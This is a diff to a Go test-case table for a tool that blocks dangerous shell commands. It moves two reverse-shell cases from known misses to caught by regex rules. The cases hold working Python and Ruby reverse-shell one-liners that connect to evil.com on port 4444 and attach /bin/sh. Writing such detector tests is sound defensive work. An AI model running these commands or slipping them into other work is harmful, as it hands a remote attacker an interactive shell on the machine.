@@ -132,26 +132,26 @@ var ReverseShellCases = []TestCase{
 		ID:               "FN-REVSH-001",
 		Command:          `python3 -c "import socket,subprocess;s=socket.socket();s.connect(('evil.com',4444));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"`,
 		ExpectedDecision: "BLOCK",
-		Classification:   "FN",
+		Classification:   "TP",
 		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
-		Analyzer:         "semantic",
-		Description: `KNOWN FALSE NEGATIVE. Python reverse shell via indirect
-			execution. The python -c command creates a socket connection
-			and spawns a shell attached to it. Current regex only catches
-			nc/socat/telnet. Requires depth-2 parsing + semantic analysis.`,
-		Tags: []string{"indirect-execution", "depth-2", "known-gap", "evasion"},
+		Analyzer:         "regex",
+		Description: `Python reverse shell via indirect execution. The python -c
+			command creates a socket connection and spawns a shell. Caught
+			by ts-block-python-reverse-shell regex matching python -c with
+			socket.socket() and .connect().`,
+		Tags: []string{"indirect-execution", "evasion"},
 	},
 	{
 		ID:               "FN-REVSH-002",
 		Command:          `ruby -rsocket -e 'f=TCPSocket.open("evil.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
 		ExpectedDecision: "BLOCK",
-		Classification:   "FN",
+		Classification:   "TP",
 		TaxonomyRef:      "data-exfiltration/network-egress/reverse-shell",
-		Analyzer:         "semantic",
-		Description: `KNOWN FALSE NEGATIVE. Ruby reverse shell. Similar pattern
-			to Python case but using Ruby's socket library. Not caught
-			by current regex rules.`,
-		Tags: []string{"indirect-execution", "depth-2", "known-gap", "evasion"},
+		Analyzer:         "regex",
+		Description: `Ruby reverse shell using TCPSocket. Caught by
+			ts-block-ruby-reverse-shell regex matching ruby with -rsocket
+			and TCPSocket.`,
+		Tags: []string{"indirect-execution", "evasion"},
 	},
 }
 
